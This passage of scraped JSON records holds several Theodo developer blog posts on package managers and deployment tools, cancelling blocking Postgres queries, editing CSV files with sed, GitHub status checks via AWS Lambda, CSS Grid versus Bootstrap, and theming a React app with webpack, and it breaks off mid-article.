login will quick and painless thanks to the Touch ID.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBrian Azizi\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhen I first arrived at Theodo, my whole developer world was shaken. I used to work in a robotics company, developing in C++ and Python with a Ubuntu machine, deploying on a Debian environment. And within a week, I was asked to develop new features in Javascript, on a MacBook, that needed to be deployed on an iPhone 8 and a Nexus 5. I had no clue what tools I needed to use. I was not even able to install a simple thing on that stupid Mac that did not know my dear apt-get. But I still had to work, so I followed the guidelines of my new colleagues, installing dozens of things whose purpose were unknown to me.\nOnly a few days later did I realise that, actually, I had already used each one of the tools I was told to install. But different ones, for different platforms, and different languages. The principles were the same, the purposes were the same, but the names were not. And when I understood that, everything became much simpler.\nSo today, I offer to take you on a trip. A trip through a development project. And for each tool that we will encounter on that journey, we will see which one is used depending on the platform, the programming language, or the project nature.\nAre you ready?\nThen buckle up!\n\nGetting your environment ready\nAll right, turn on your computer, and let\u2019s get started. You just arrived at your new job, and you got your machine, but have no idea how to install on it the stuff you are supposed to use.\nIt usually comes in two flavours.\nCompiled executables\n\nThose executables are binary files, specifically made to be read by a specific system (OS and CPU architecture). In other words, you cannot use the same binary files on different machines, which is why you will always need to use something specific to YOURS. The consequence is that a developer must find a way to make binary files available for every supported system.\nAnd you need to find where they are. To make this easier, each platform provides a package manager, a tool made to install so called \u201cpackages\u201d. A package is an archive containing all the files needed for installation. The package manager knows where to look and automatically downloads the package upon request.\nThose binaries are generally installed \u201cglobally\u201d, in the \u201csystem\u201d part of the filesystem (/usr/lib, /Library, C://, \u2026). Any project on your machine will have access to it (that\u2019s cool, right?). The negative part is that you usually can have only one version installed (so if you need two different versions for two different projects, it might be painful).\n\n\n\n\n\n\n\n\n\n\n\nPackage manager\napt-get\nHomebrew\nChocolatey\n\n\nExecutables go in\n/usr/bin\n<PKG-ROOT>/bin\n\n\n\nLibraries go in\n/usr/lib\n<PKG-ROOT>/lib\n\n\n\nHeaders go in\n/usr/include\n<PKG-ROOT>/include\n\n\n\nResources go in\n/usr/share\n<PKG-ROOT>/share\n\n\n\nNatively installed\nYes\nNo\nNo\n\n\nComments\n\nPKG-ROOT is /usr/local/Cellar/<package>\nSymbolic links are then added in\n/usr/local/bin\n/usr/local/lib\n/usr/local/include\n/usr/local/share\nfor each package\nThere are many different installation rules. You can find more details here.\n\n\n\nUncompiled code\n\nCode can sometimes be directly executed without being compiled, using a program called an interpreter. Thanks to that, this code is not dependent of the machine it is run on, only of the language it is written into, and the interpreter version. It is then much more interesting for the developers to distribute their product via package managers related to the language they use rather than the platform you are using. Another difference is that these package managers use a repository containing the packages which can be installed, instead of storing them somewhere and pointing them out by a entry in a text file. Those packages are usually installed locally (directly in the project folder), so that only this project can use it. The good part is that you can use different versions of the same package for different projects.\n\n\n\n\nPackage manager\nMain registry\n\n\n\n\n\npip\nhttps://pypi.python.org/pypi\n\n\n\nyarn\nhttps://registry.yarnpkg.com\n\n\n\ncomposer\nhttps://packagist.org/packages/\n\n\n\nmaven\nhttps://mvnrepository.com/artifact/\n\n\n\ngem\nhttps://rubygems.org/gems/\n\n\n\n\n\n\n\nPackages go in\nComments\n\n\n\n\n\nA global folder on your system \npip stores packages in the root filesystem by default, in the user filesystem upon request. To store packages within the project, you need to use the virtualenv package\n\n\n\n./node_modules\nFor NodeJS also exists npm, which actually is the official one. Both are similar and works the same way, although yarn seems to be way faster\n\n\n\n./vendor\n\n\n\n\n./target/dependency/BOOT-INF/lib\n\n\n\n\nA global folder on your system \ngem also installs packages in a folder unrelated to your project, but you can choose which one it will be. To install packages in a folder specific to your project, you can use bundler\n\n\n\nHandling cross-platform development\n\nNow, let\u2019s say you are working on a project where your target is different from your development environment.\nThis is actually extremely common. You can be working on a website for instance (you probably don\u2019t have the exact same configuration as the server machine), or you could be developing a mobile application, or a library for a robot. You could also be working on a program that should be runnable on Mac AND Windows, etc..\nTo test that your product actually works on the target environment, you will need to use emulation tools (or have an equal number of devices and targets, which is not always practical). For mobile development, there are powerful simulators which allow the testing of several shapes of mobiles and several OS versions. They also allow the emulation of mobile-specific inputs, like GPS.\nThe ones I know about (there might be others):\n\nXCode\u2018s Simulator (iOS)\nAndroid Studio\u2019s emulator (Android)\nGenyMotion (Android)\n\nFor \u201ccomputer\u201d environments, you can use virtual environments. They can be created by:\n\nVagrant (virtual machine handler)\nDocker (virtual environment running on your real machine)\n\nDocker is lighter than a virtual machine, but provides less insulation (although this is not important in most projets). Also, only a Linux environment can be emulated. Vagrant is actually more a virtual machine manager. It is based on programs like VMWare and VirtualBox to build virtual machines from a script.\nTo know more about the difference between Docker and Virtual machines, you can have a look at this blog article which gives a generic explanation of the difference or this StackOverflow\u2019s answer giving more technical details.\nTesting your feature\n\nYou now have everything you need to install the dependencies of your project. You are ready to go, ready to develop on any platform, in any language. But after finishing your first feature, a new problem arises: tests.\nWhat are you supposed to use to test your code on this alien environment? Well thankfully, as you would expect, there is always at least one unit test library for each language.\n\n\n\n\nFramework\n\n\n\n\n\npytest\n\n\n\njest, mocha, chai\n\n\n\njunit\n\n\n\ngtest (among many others)\n\n\n\nphpunit\n\n\n\n(built-in)\n\n\n\nThere are of course several other kinds of tests (end to end, integration, api, stress, static type) but they are not as widely represented as unit tests, because their value relies more on the language, and what it is used for.\nFor instance, static type tests on c++ or java is useless (because proper typing is assured by the language itself). If you develop a graphical interface in python, you will need to use a specific framework, which will (or will not) provide end to end testing capabilities. But Python won\u2019t.\nAnother thing you might want to do is to make sure your project works under different versions of the language you use. To test that, you can use a language\u2019s version manager if it exists (so you don\u2019t need to use several VMs/docker images with different languages versions).\n\n\n\nLanguage\nVersion manager\n\n\n\n\n\nnvm\n\n\n\nrvm\n\n\n\npyenv\n\n\n\nThis feature is also widely used for solely development purposes, if different projects you are working on need different language versions. This helps you to keep a clean environment and is very handy.\nDeploying the feature\nAlright, your tests are fine, your code has been approved by a peer, now you need to push it into production.\nUntil now, we did not really care about the type of project you were working on (installing dependencies and testing your code is something to do in every project). But the deployment will be much more tied to the nature of the project. Besides, not only do we need to deploy our new feature, we also need to make sure our dependencies are available on the target machine.\nI am working on a library for others to use\nHere, \u201cdeploying to production\u201d means \u201cmaking the newest version available for download and installation\u201d. Do you remember what we said about package managers? That they help you install software made by others? Well, now you are on the other side of the mirror. So you need to ask yourself one simple question:\n\nAm I trying to distribute compiled code, which is therefore platform specific?\n\nWhichever the answer, you will need to look for how to build a package for one or more specific package managers.\nThe answer will only guide you in your selection. Platform-wise package managers, or language-related package managers?\nI am working on a web application\nIn this case, deploying to production means sending the newest version of your product on the server hosting it. The number of possible tools\u2019 combinations is too huge to be listed here, so only the main ones will be described.\n\nPack your application in a docker, send it to a docker host using docker api, then start your application with\n\nDocker Compose (starts one or more containers on one host)\nDocker Swarm (starts one or more containers on several hosts)\nKubernetes (very close to docker swarm, developed by Google)\nOr one of these\n\n\n\nTo know more, you can find a pretty good comparison of Kubernetes and Docker Swarm here.\n\nConfigure a remote machine to download your application (from github for instance) and its dependencies (also called \u201cprovisioning\u201d)\n\nChef\nCapistrano\nShipit (Alternative to capistrano in JS)\nAnsible\nand many others\n\n\n\nBy the way, although Chef and Capistrano are perfectly capable of deploying your app AND configuring the host server by themselves, it seems better to actually use both, as explained in this article.\nI am working on a mobile application\nIn this situation, you need to package your app and send it to a storing server. It is actually pretty similar to providing a library, except the tools use to package and upload the app are quite different. The main one I encounter is Fastlane\nAnd that\u2019s it\nHey, you made it. You actually managed to install your dependencies, on your machine and on the target system. You developed your feature using an emulated environment, and tested it using an appropriate unit test framework. Finally, you deployed your newly added feature to prod.\nCongratulations!\nYou managed to work efficiently, even in an alien environment.\nYou can be proud!\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSurya Ambrose\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHave you ever accidentally run a blocking migration on your Postgres database? Here\u2019s how to fix it in under 1 minute:\nFirst, connect to your database instance.\nNow, run the query: SELECT pid, query_start, query FROM pg_stat_activity\nThis will return a table listing all the processes running on the database, with the date they started and the query.\nIt should be easy to identify the pid (process id) of the blocking query\nNow run SELECT pg_cancel_backend([pid]) to cancel that transaction\nCongrats, you are done!\nFinally, you fool! If you want to avoid table locks you should avoid the following types of migration:\n\nAdding a new column with a default value\nChange the type of a column\nAdding a new non nullable column\nAdding a column with a uniqueness constraint\n\n What exactly are we doing here? \nThe table in Postgresql called pg_stat_activity is a record of all the processes currently running on the database at that moment. We use this to find the process ID of the thread controlling the overrunning transaction \u2013 we then use pg_cancel_backend function to cancel whatever process is running it.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJosh Warwick\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tRecently I needed to transform a csv file with some simple processing. If you want to transform a file line by line, replacing a few things, deleting a few others, regular expressions are your friend.\nSed is a unix command line utility for modifying files line by line with regular expressions. It\u2019s simpler than awk, and works very similarly to the vim substitution you may be vaguely familiar with.\nWe\u2019re going to take a csv file and do the following with regex + sed:\n\nDelete some rows that meet a condition\nDelete a column (alright, I admit excel\u2019s not bad for this one)\nModify some cells in the table\nMove some data to its own column\n\nWe\u2019ll be using this mock csv file data set:\n\r\nname;id;thumbnail;email;url;admin;enabled\r\nDan Smith;56543678;dan_profile.jpg;dan@test.com;http://site.com/user/dan;false;true\r\nJames Jones;56467654;james_profile.png;james@test.com;http://site.com/user/james;false;true\r\nCl\u00e9ment Girard;56467632;clement_profile.png;clement@test.com;http://site.com/user/clement;false;false\r\nJack Mack;56485367;jack_profile.png;jack@test.com;http://site.com/user/jack;true;false\r\nChris Cross;98453;chris_profile.png;chrisk@test.com;http://site.com/user/chris;true;true\r\n\nRemoving some users\nFirst let\u2019s remove users who are not enabled (last column == false). Sed lets us delete any line that return a match for a regex.\nThe basic structure of a sed command is like this:\nsed 's/{regex match}/{substitution}/' <input_file >output_file\nThere\u2019s also a delete command, deleting any line that has a match:\nsed '/{regex match}/d' <input_file >output_file\nLet\u2019s use it\nsed '/false$/d' <test.csv >output.csv\n\nThat command deletes these line in the csv:\n\r\nCl\u00e9ment Girard;56467632;clement_profile.png;clement@test.com;http://site.com/user/clement;false;false\r\nJack Mack;56485367;jack_profile.png;jack@test.com;http://site.com/user/jack;true;false\r\n\nSome of our users also have an old user Id (only 5 digits). Let\u2019s delete those users from our csv too.\nsed -r '/;[1-9]{5};/d' <test.csv >output.csv\n\nThat command deletes this line in the csv:\n\r\nChris Cross;98453;chris_profile.png;chrisk@test.com;http://site.com/user/chris;true;true\r\n\nHere we\u2019re using the OR syntax: []. This means that the next\u00a0character in the match\u00a0will be one of the\u00a0chars between the braces, in this case it\u2019s a range of possible digits between 1 and 9.\nWe\u2019re also using the quantifier {}, it repeats the previous character match rule 5 times, so will match a 5 digit number.\nNote we added the -r flag to sed so that we could use regex quantifier. This flag enabled extended regular expressions, giving us extra syntax.\nRemoving a column\nNext we want to remove the admin column. Removing the \u2018admin\u2019 column title is easy enough, but let\u2019s use regex to remove the data. Our csv has 2 boolean columns, admin and enabled, we want to match both of these, and replace the match with just the \u2018enabled column\u2019, which we want to keep.\nsed -r 's/(true|false);(true|false)$/\\2/' <test.csv >output.csv\n\nIn this example we\u2019ve used capture groups. By surrounding a match in parentheses, we can save it to a variable \u2013 the first capture is saved to \u2018\\1\u2019, the second to \u2018\\2\u2019 etc.\nIn the substitution section of our sed string, we replaced the entire match with capture group \u2018\\2\u2019. In other words we\u2019ve replaced the final two columns in each row with just the final column, thus removing the second-to-last column from the csv.\nWe\u2019ve also used the pipe \u2018|\u2019 as an OR operator, to match \u2018true\u2019 or \u2018false\u2019.\nWe\u2019re left with a csv that looks like this:\n\r\nname;id;thumbnail;email;url;enabled\r\nDan Smith;56543678;dan_profile.jpg;dan@test.com;http://site.com/user/dan;true\r\nJames Jones;56467654;james_profile.png;james@test.com;http://site.com/user/james;true\r\n\nModifying cells in the table\nNext we\u2019re going to modify the url column to store the relative url rather than the absolute path. We can use a regex like this:\nsed 's_http:\\/\\/site[.]com\\/\\(.*\\)_\\1_' <test.csv >output.csv\nThis is very difficult to read because we have to escape each forward slash in the url with a backslash. Fortunately, we can change the sed delimiter from a forward slash to an underscore. This means we don\u2019t have to escape forward slashes in the regex part of our sed command:\nsed -r 's_http://site[.]com/(.*)_\\1_' <test.csv >output.csv\nThat\u2019s much more readable!\n\nHere we match any characters after the base url using .* (this will match everything after the base url in the row). We save that in a capture group, so we now have a string starting with the relative url. By substituting the match with this, we\u2019ve replaced the full url with the relative url.\nWe\u2019re left with a csv that looks like this:\n\r\nname;id;thumbnail;email;url;enabled\r\nDan Smith;56543678;dan_profile.jpg;dan@test.com;user/dan;true\r\nJames Jones;56467654;james_profile.png;james@test.com;user/james;true\r\n\nMoving data to its own column\nFinally, let\u2019s take a column and split it into 2, moving some of its data to the new column. Let\u2019s replace the name column with \u2018first name\u2019 and \u2018last name\u2019. We can start by renaming the headers in the first row, then use sed + regex to split each row in our csv in 2 automatically!\nWe could start with this:\nsed -r 's/^([a-zA-Z]* )/\\1;/' <test.csv >output.csv\n\nHere we use OR square bracket [] notation again. In this case we match a character in a range of upper or lower case alphabetical characters. On Ubuntu Linux, this matches international alphabet characters like \u00e9, but this depends on your environment.\nWe save everything up to a space character (which delimits the first name from the last name) into a capture group and substitute it with itself plus a \u2018;\u2019 \u2013 thus moving first name into its own column.\nThe problem with this is our first name is left with a trailing space character before the column delimiter (;). It would look like this:\n\r\nfirst name;last name;id;thumbnail;email;url;enabled\r\nDan ;Smith;56543678;dan_profile.jpg;dan@test.com;user/dan;true\r\nJames ;Jones;56467654;james_profile.png;james@test.com;user/james;true\r\n\nInstead, we can do something like this:\nsed -r 's/^([a-zA-Z]*)( )(.*)$/\\1;\\3/' <test.csv >output.csv\nThis matches the space character, but also saves it into capture group \u2018\\2\u2019. We then substitute the whole match with \\1;\\3 \u2013 effectively putting everything back together without the space, and putting a \u2018;\u2019 character in its place. We now have our new columns, first name and last name.\nThere\u2019s actually an even easier solution than this, we just replace the first empty space in each row with a \u2018;\u2019 like this:\nsed -r 's/ /;/' <test.csv >output.csv\nThat was fast and easy!\nWe\u2019re left with a csv that looks like this:\n\r\nfirst name;last name;id;thumbnail;email;url;enabled\r\nDan;Smith;56543678;dan_profile.jpg;dan@test.com;user/dan;true\r\nJames;Jones;56467654;james_profile.png;james@test.com;user/james;true\r\n\nWith only a few commands, we\u2019ve managed to transform a csv from our terminal.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tDaniel Leary\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\"Can't you name all your pull requests in the right format?\"\r\n\n\"...Oops I just merged into production\"\r\n\nUsing AWS lambdas can be a cool and useful way to improve your workflow with GitHub.\nBlocking merges when tests fail on your branch is common, but GitHub status checks can be pushed much further.\nCombining GitHub\u2019s API and Lambdas provides this opportunity.\nStatus Checks\nTurns out we can use a Github Webhook Listener to POST to an AWS lambda after any specified events(pushes, commits, forks, pull requests etc).\nIn response, lambdas can in turn POST back to a Pull Request and create/update a status check.\nOr they can just POST at specified times.\nTo test this out and get it up and running, we could impose two checks:\n\nA required format for pull request titles\nSpecific times where merging to production is prohibited\n\nFor a full in-depth guide on setting all this up for your project see my github-lambda-status-checks repo.\nEvent Listener\nFirst we set up a lambda which can react to a JSON of information about a pull request.\nAfter deploying the lambda via serverless we are given an endpoint which, using GitHub webhooks, can automatically be hit on every pull request action(create, edit, \u2026)\nThe webhook provides the lambda with a large amount of information about the PR.\nAn abridged version of some of the information sent to the lambda is shown below:\nAbridged GitHub Status Post\nAmongst this, we are given a statuses_url to which we can send a POST request back to the GitHub API to create/update a status.\nFor example, sending the following created the fake CI status in the title image:\nSuccess GitHub Status\nWe can add any logic based on say, the pull request title, to send back a status result (\u2018success\u2019, \u2018failure\u2019, \u2018pending\u2019).\nPost GitHub Status\nThese will appear, as in the title image, depending on the state sent.\nIn github-lambda-status-checks you can add any logic to gitWebhookListener.js from line 78 to tweak your status responses.\nAfter any status check(which are unique by their context) has run at least once in a repo, it can be chosen as a Required status check on any protected branches(settings -> branches).\nThis will prevent the PR being merged unless the status check has a success state (see title image).\nCron Job\nLambdas can also be setup to trigger at set times in the day.\nUsing the GitHub API the lambda can say, GET all the pull requests from a given repo merging into the production branch.\nAt 4pm it could then send a pending state to all of these pull requests. If this check is set as Required, it would then block accidental merging at inappropriate times.\nYou could then trigger another lambda at 8am to unblock all these PRs.\nGotcha\nIf you set this status to \u2018Required\u2019 then any new pull request can not be merged until it passes this check, which won\u2019t be until 8am the next day\u2026\nTo overcome this you can check the time in the pull request event listener so that any new pull request can pass/fail the time check as expected.\nWhat we did\nWe wanted to move a long running project from merging to production twice a week, to continuously deploying with every ticket.\nThe lambdas in this article came about to address some concerns we had about this.\nTitle Checker\nOur release notes (linked directly to pull request titles) needed to accurately reflect what was in production at a given time (as opposed to random commit titles).\nDevs/stakeholders needed to be able to quickly associate a pull request title to a team, ticket number and user story:\n(A-TEAM 123) AAC I love this product\r\n\nThis was implemented similar to gitWebhookListener.js with simple JS/regex.\nTime Checker\nOur team had become accustomed to merging a validated ticket to a master branch.\nThis master branch would then be merged/deployed into production twice a week.\nThe worry with continuous deployment (eliminating master) was that a ticket may accidentally be merged to production (after validation) too late in the day (when bugs can\u2019t be monitored/fixed).\nThus the timed lambda in githubTimeStatus.js (and the gotcha in githubWebhookListener.js) was implemented.\nFurther Applications\nAs we have seen, the response from GitHub provides a lot of information about the PR, so you could adapt this to any need you may have.\nReferences\nFor a full in-depth guide on setting this up for your project see mygithub-lambda-status-checks repo.\nLinks\n\nGitHub webhook listner Source\nSupport for ES6/ES7 Javascript\nServerless\nGitHub API for statuses\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tRob Cronin\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhy did I stop using\u00a0Bootstrap?\n\nBootstrap is too verbose: you need plenty of div even if you only have a couple of blocks in your layout\nThings get even worse when you add responsiveness\u2026\n\u2026 or when you want to move your blocks around\nBootstrap\u2019s grids are limited to 12 columns\nBy default, Bootstrap has 10-pixel paddings that are complex to override\nBootstrap has to be downloaded by the users, which slows down your website\n\nHow to create a layout for your website without Bootstrap\nLet\u2019s say you have the following layout that you want to integrate:\n\nWhat it would be like with Bootstrap\n<body>\r\n  <div class=\"container\">\r\n    <div class=\"row\">\r\n      <div class=\"col-12 header\">...</div>\r\n    </div>\r\n    <div class=\"row\">\r\n      <div class=\"col-4 navigation-menu\">...</div>\r\n      <div class=\"col-8 main-content\">...</div>\r\n    </div>\r\n    <div class=\"row\">\r\n      <div class=\"col-12 footer\">...</div>\r\n    </div>\r\n  </div>\r\n</body>\nEven though\u00a0there are only four blocks,\u00a0you needed nine different div to code your layout.\nHow much simpler it would be with CSS Grid\nThanks to CSS Grid, you can get the same result with only five div!\n<body>\r\n  <div class=\"container\">\r\n    <div class=\"header\">...</div>\r\n    <div class=\"navigation-menu\">...</div>\r\n    <div class=\"main-content\">...</div>\r\n    <div class=\"footer\">...</div>\r\n  </div>\r\n</body>\nThough it will not be as simple as just importing Bootstrap, you will have to add some extra CSS.\n.container {\r\n  display: grid;\r\n  grid-template-columns: repeat(12, 1fr);\r\n}\r\n.header {\r\n  grid-column: span 12;\r\n}\r\n.navigation-menu {\r\n  grid-column: span 4;\r\n}\r\n.main-content {\r\n  grid-column: span 8;\r\n}\r\n.footer {\r\n  grid-column: span 12;\r\n}\nIn the example above, you first defined the container as a 12-column grid.\nAnd then, you set the number of tracks the item will pass through.\nWhat about responsiveness?\nMoreover you may want to have a responsive layout for smartphones and tablets.\n\nWith Bootstrap\nAs the design gets more complex, your HTML also gets more complex with more and more classes:\n<body>\r\n  <div class=\"container\">\r\n    <div class=\"row\">\r\n      <div class=\"col-xs-12 header\">...</div>\r\n    </div>\r\n    <div class=\"row\">\r\n      <div class=\"col-xs-12 col-md-6 col-lg-4 navigation-menu\">...</div>\r\n      <div class=\"col-xs-12 col-md-6 col-lg-8 main-content\">...</div>\r\n    </div>\r\n    <div class=\"row\">\r\n      <div class=\"col-xs-12 footer\">...</div>\r\n    </div>\r\n  </div>\r\n</body>\nWith CSS Grid\nWith CSS Grid, if you want to add responsiveness to your layout, there is no need to change the HTML.\nYou only need to add some media queries to our CSS stylesheet:\n...\r\n@media screen and (max-width: 768px) {\r\n  .navigation-menu {\r\n    grid-column: span 6;\r\n  }\r\n  .main-content {\r\n    grid-column: span 6;\r\n  }\r\n}\r\n@media screen and (max-width: 480px) {\r\n  .navigation-menu {\r\n    grid-column: span 12;\r\n  }\r\n  .main-content {\r\n    grid-column: span 12;\r\n  }\r\n}\r\n\nWhat if you wanted to move your blocks around?\nLet\u2019s say that instead of the above layout on mobile, you wanted the navigation menu to be above the header:\n\nWith Bootstrap\nYou would have had to duplicate your menu, hide one and display the other on mobile and vice versa on desktop:\n<body>\r\n  <div class=\"container\">\r\n    <div class=\"row\">\r\n      <div class=\"col-xs-12 hidden-sm-up navigation-menu-mobile\">...</div>\r\n      <div class=\"col-xs-12 header\">...</div>\r\n    </div>\r\n    <div class=\"row\">\r\n      <div class=\"col-md-6 col-lg-4 hidden-xs-down navigation-menu\">...</div>\r\n      <div class=\"col-xs-12 col-md-6 col-lg-8 main-content\">...</div>\r\n    </div>\r\n    <div class=\"row\">\r\n      <div class=\"col-xs-12 footer\">...</div>\r\n    </div>\r\n  </div>\r\n</body>\nAnd the HTML gets more and more complex as your layout grows.\nWith CSS Grid\nYou only need one single line of CSS to move the navigation menu to the top on mobile and here is how to do so:\n...\r\n@media screen and (max-width: 480px) {\r\n  .navigation-menu {\r\n    grid-row: 1;\r\n    grid-column: span 12;\r\n  }\r\n  ...\r\n}\r\n\nCustomize your grid layout!\nHave as many or as few columns as you want\nBy default, Bootstrap comes with a 12-column grid system.\nThis value can be overridden but if you do so, it will be overridden everywhere in your app.\nOn the other hand, with CSS Grid, you can specify the number of columns per row for each of your grids.\nIn grid-template-columns: repeat(12, 1fr);, you can just set the number of columns you want instead of 12.\nUnwanted 10-pixel paddings\nBootstrap\u2019s columns have 10-pixel paddings on their right and left.\nThe most advised solution to override them is to use padding-right: 0 !important; and padding-left: 0 !important;.\nAs with CSS Grid you have control over all your CSS classes, you can set the paddings you want everywhere.\nNo more need to download any library\nEven if Bootstrap\u2019s stylesheet only weights a few kB, it still slows down the loading of your page.\nAll major browsers shipped their implementation of CSS Grid in 2017, so there is no need to download any extra CSS to use CSS Grid!\nAt the time of this article (April 2018), 89% of browsers are compatible with CSS Grid.\n\nThat\u2019s all for now!\nHere are\u00a0some of the main reasons why I no longer use Bootstrap.\nPart 2 on how I also managed to replace Flexbox with CSS Grid is coming!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tC\u00e9dric Kui\r\n  \t\t\t\r\n  \t\t\t\tI enjoy browsing cat and panda GIFs while drinking tea. Oh, I am also a Web Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAs a web developer you may have already worked on a project where you had a single web application that was used by several different clients. The app would use a single code base but then it would need to have several variants, each personalized for a specific client:\n\nyou may need to change the look and feel of the app (turquoise color theme background instead of a red one, text aligned on the right instead of left, different fonts and illustrations)\nthe API calls you are making may vary depending on the client: each client could want to to have his own wording and you would need to fetch different i18n key-values depending on the client.\n\nImagine you develop a ticket selling platform and you offer a ticket selling app that is integrated in websites of your clients that include theaters, sports organisations and art galleries. You will most likely need to change the design and layout of the app for each of the clients so that it corresponds to the look and feel of their website.\nIn this article, I will show you how to have several personalized versions of your app while keeping a single code base.\n\nWe will begin with a simple ReactJS poll app styled using a styled-components theme.\nThen we will\u00a0create a second version of the app by adding another style theme and some structural differences.\nLastly we will configure the build so that we are able to switch between the two versions of the app.\n\nTo help you easily set up the project there is a companion repository.\nInitializing the project and creating a basic app\nStart by checking out the project and installing the required packages:\ngit clone https://github.com/invfo/theming-with-webpack.git\r\ncd theming-with-webpack\r\ngit checkout 514f5fd //checkout the commit pointing to the first version of the app\r\nnpm install\r\n  \nThen start the development server: npm start and go to http://localhost:8080 in the browser. You should see the following poll with two options and a submit button.\n\nCustomizing the app\nWe will now create a second version of this polling app.\nChanging the look and feel\nBegin by adding a second theme and a switch between two themes based on a THEME variable (which we will define later):\n// index.js\r\nconst advancedTheme = {\r\n  background: 'linear-gradient(#68C5DB, #E0CA3C)',\r\n  button: {\r\n    border: '3px black dotted',\r\n    borderRadius: '23px',\r\n    fontSize: '30px',\r\n    marginTop: '17px',\r\n    padding: '5px 10px',\r\n  },\r\n};\r\nconst theme = THEME === 'advanced' ? advancedTheme : basicTheme;\r\n  \nPass the new theme to the ThemeProvider:\n<ThemeProvider theme={theme}> // index.js\r\n  \nAdd a Title component and display it based on the THEME variable :\n// index.js\r\nconst Title = ({children}) => <h1>{children}</h1>\r\n\r\nclass App extends React.Component {\r\n  render() {\r\n    return (\r\n      <ThemeProvider theme={theme}>\r\n        <Wrapper>\r\n          { THEME === 'advanced' && <Title>Make your choice!</Title>}\r\n          ...\r\n  \nCheckout the corresponding commit in the companion repository to see other minor changes that should be made.\nSetting up the THEME variable\nTo be able to switch between the two app versions we need to define the THEME variable which we will wire to an environment variable of the same name.\nBegin by setting the THEME environment variable at build time and making it available in our app.\nAdd a build command for each app version. These commands will set the THEME environment variable to either red or blue :\n// package.json\r\n\"scripts\": {\r\n  \"start:basic\": \"cross-env THEME=basic webpack-dev-server\",\r\n  \"start:advanced\": \"cross-env THEME=advanced webpack-dev-server\"\r\n}\r\n  \nYou may wonder \u201c\u2019Cross-env\u2019? Why not simply use THEME=red webpack-dev-server?\u201d. This option would work fine on most OSs, but can be troublesome if you are using Windows.\nCross-env allows you to define environmental variables without worrying about particularities of the platform you are using. Install it: npm install --save-dev cross-env\nFinally let\u2019s put together everything we did in previous steps: make the THEME environment variable available in the app code\n// webpack.config.js\r\nplugins: [\r\n  new webpack.DefinePlugin({\r\n    THEME: JSON.stringify(process.env.THEME),\r\n  }),\r\n]\r\n  \nDefinePlugin enables you to create global constants that are configured during compilation. Here we\u2019re using it to define a THEME variable that is usable in our app\u2019s code. Its value will be equal to the THEME environment variable set using cross-env.\nFor more info see the official webpack doc.\nNow try out one of the new builds: npm run start:advanced\nYou should see the new version of the app:\n\n\n\nTo view the old version, run npm run start:simple\nYou can always get the latest app code version from the companion repository.\nTo sum up\nSo far we have learned how to:\n\nDefine your app\u2019s style and manage several CSS themes using styled-components and its ThemeProvider (check out the official docs for more information)\nSet up environment variables for the build using cross-env\nMake previously set environment variables available in your app\u2019s code using webpack\u2019s DefinePlugin\nModify app\u2019s content based on an environment variable value (on the example of <input>)\n\nUsing the above concepts you can personalize your ReactJS app and have several builds, each of them generating an app with a specific look.\nThe proposed method is suitable when the personalization you need to make:\n\nconcerns style or\nbasic html structure (like changing input types or adding 